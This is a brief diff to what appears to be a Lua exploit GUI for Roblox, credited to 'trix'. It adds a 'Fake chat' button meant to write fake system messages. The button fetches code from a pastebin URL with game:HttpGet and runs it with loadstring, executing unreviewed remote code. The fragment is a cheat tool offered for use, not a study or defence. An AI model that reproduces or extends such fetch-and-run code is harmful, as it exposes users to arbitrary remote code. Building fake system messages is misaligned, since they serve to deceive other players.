@@ -138,9 +138,13 @@ TextButton.MouseButton1Click:Connect(function()
 	end
 end)
 
---//fsddfsdf
+--//end
 notif("UI modded by trix..", 5)
    
+end)
+
+Section:NewButton("Fake chat", "Write fake system messages", function()
+ loadstring(game:HttpGet('https://pastebin.com/raw/MdSA4fn5'))()
 end)
 
 local Section = Tab:NewSection("Moblie")
